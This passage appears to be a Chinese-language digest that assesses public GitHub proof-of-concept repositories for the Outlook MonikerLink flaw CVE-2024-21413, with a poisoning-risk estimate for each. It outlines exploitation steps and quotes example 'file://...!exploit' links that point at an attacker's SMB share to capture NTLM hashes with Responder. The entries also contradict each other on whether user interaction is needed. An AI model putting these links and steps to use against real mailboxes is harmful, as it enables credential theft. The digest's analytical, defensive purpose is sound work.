5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #8

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

提供的代码包含SMTP和POP3服务器的Python脚本，以及利用漏洞的exploit脚本。仔细检查这些脚本，未发现明显的恶意代码。但是，使用第三方提供的exploit脚本始终存在风险，因为攻击者可能在其中植入恶意代码。经过分析，投毒风险评估为10%。主要风险点在于对第三方脚本的信任。

**总结：**

CVE-2024-21413是一个严重的Outlook RCE漏洞，攻击者可以通过诱使用户点击恶意链接来利用该漏洞。提供的POC代码主要用于演示NTLM哈希泄露，而非完整的RCE。在使用任何第三方提供的漏洞利用代码时，都需要谨慎评估其安全性。

**项目地址:** [PolarisXSec/CVE-2024-21413](https://github.com/PolarisXSec/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md](../2024/CVE-2024-21413-Redfox-Secuirty_Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 无需用户交互，攻击者可以通过发送特制的电子邮件来触发漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。根据漏洞库信息和搜索结果，该漏洞是由于不正确的输入验证导致的。攻击者可以通过构造包含恶意链接的电子邮件，在用户未进行任何交互的情况下，远程执行代码。提供的漏洞利用代码 `README.md` 文件内容仅包含标题，无法判断其有效性。根据Github信息判断，存在可利用的POC。由于 `README.md` 文件过于简单，且未发现任何可疑代码，因此判定存在投毒代码的可能性为 0%。利用方式为，攻击者构造包含恶意 MonikerLink 的电子邮件，当 Outlook 处理该邮件时，漏洞被触发，从而允许攻击者执行任意代码。

**项目地址:** [Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape](https://github.com/Redfox-Secuirty/Unveiling-Moniker-Link-CVE-2024-21413-Navigating-the-Latest-Cybersecurity-Landscape)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #10

**来源**: [CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md](../2024/CVE-2024-21413-ShubhamKanhere307_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，CVSS评分9.8，允许远程代码执行

**影响版本:** 受影响版本包括但不限于：Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019 (版本低于https://aka.ms/OfficeSecurityReleases)，Microsoft 365 Apps for Enterprise (版本低于 https://aka.ms/OfficeSecurityReleases)，Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要诱骗受害者点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为"MonikerLink" bug。该漏洞源于不正确的输入验证。攻击者可以通过发送特制的电子邮件，诱使用户点击其中的恶意链接，从而在用户系统上执行任意代码。

**有效性分析：**

提供的POC代码尝试利用该漏洞。它创建一封包含HTML链接的电子邮件，该链接指向一个`file://` URL。 此URL试图访问远程SMB共享，从而可能导致NTLM凭据泄露或远程代码执行，这取决于服务器的配置和Outlook的漏洞利用机制。

**投毒风险分析：**

提供的`Exploit.py`脚本主要功能是发送电子邮件。代码中没有发现明显的恶意或隐藏的投毒代码。该脚本会获取发件人的Outlook电子邮件地址和密码，以及收件人的电子邮件地址和邮件主题。脚本允许用户选择是否添加链接附件。 如果选择添加，则会添加指向指定IP地址（例子中为`file://///192.168.0.103/test!exploit`）的链接，否则添加用户自定义的邮件正文。该脚本使用`smtplib`库连接到Outlook的SMTP服务器（`smtp-mail.outlook.com`），并发送电子邮件。 没有发现任何会将用户凭据泄露给第三方的行为。

**漏洞利用方式分析：**

该漏洞利用方式依赖于`file://`协议处理中的缺陷。当Outlook处理包含指向SMB共享的`file://`链接的电子邮件时，它可能会尝试自动访问该共享，从而可能泄露用户的NTLM凭据或允许攻击者执行任意代码。 该PoC 通过构造包含恶意链接的HTML电子邮件来尝试利用此漏洞。 攻击者诱使用户点击此链接，从而触发漏洞。

总而言之，POC代码尝试通过`file://`协议利用Outlook的漏洞来实现远程代码执行，虽然该POC本身没有明显的投毒代码，但成功利用依赖于目标的网络配置和安全设置。

**项目地址:** [ShubhamKanhere307/CVE-2024-21413](https://github.com/ShubhamKanhere307/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #11

**来源**: [CVE-2024-21413-ThemeHackers_CVE-2024-21413.md](../2024/CVE-2024-21413-ThemeHackers_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，攻击者无需用户交互即可在目标系统上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 攻击者需要能够向受害者发送电子邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也称为“MonikerLink”漏洞。根据漏洞库信息和搜索引擎结果显示，该漏洞允许攻击者在受害者的计算机上执行任意代码，而无需任何用户交互。这个漏洞是由于对输入验证不当造成的(CWE-20)。

**利用方式：**

1.  攻击者创建一个特制的电子邮件，其中包含恶意的链接或嵌入的内容。
2.  当受害者收到并打开此电子邮件时，Outlook 会尝试解析该链接。
3.  由于漏洞存在于 Outlook 的链接处理机制中，攻击者可以利用此漏洞绕过安全检查，从而执行任意代码。

**POC代码分析：**

提供的POC代码是一个Python脚本，用于发送包含HTML内容的电子邮件。该脚本从 `config.ini` 文件中读取发件人邮箱地址、密码、SMTP服务器和端口。然后它使用模板 `template/Stripo.html` 构造电子邮件的内容，并将收件人的邮箱地址和链接内容插入到HTML代码中。最后，该脚本使用smtplib库发送电子邮件。

**有效性评估：**

根据搜索引擎的结果 (特别是github链接: ThemeHackers/CVE-2024-21413) 和漏洞描述, 此POC是可用的,可以用于漏洞验证的.

**投毒风险分析：**

代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **config.ini文件：** POC依赖于 `config.ini` 文件,需要用户配置邮箱账户和密码。 如果恶意攻击者提供了一个修改后的 `config.ini` 文件，其中包含错误的SMTP配置或恶意代码，可能导致用户的信息泄露或者执行未知的操作。
*   **template/Stripo.html模板：** HTML模板允许插入任意HTML代码，如果攻击者篡改了HTML模板, 就可以嵌入恶意的JavaScript或其他类型的脚本，在用户打开邮件时执行。
*   **依赖的外部库:** colorama, bgtask, configparser， 攻击者可能修改这些依赖，在用户本地执行恶意命令

总体而言，该POC的投毒风险大约为30%。 这个评估是基于对代码的分析以及对潜在攻击向量的理解。需要注意的是，具体的风险程度取决于攻击者的能力和目标用户的安全意识。

**项目地址:** [ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #12

**来源**: [CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md](../2024/CVE-2024-21413-X-Projetion_CVE-2024-21413-Microsoft-Outlook-RCE-Exploit.md)

## CVE-2024-21413-Microsoft-Outlook-RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，无需用户交互即可远程执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise，具体版本请参考CVE详情。

**利用条件:** 攻击者需要通过发送特制的电子邮件给受害者。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #13

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

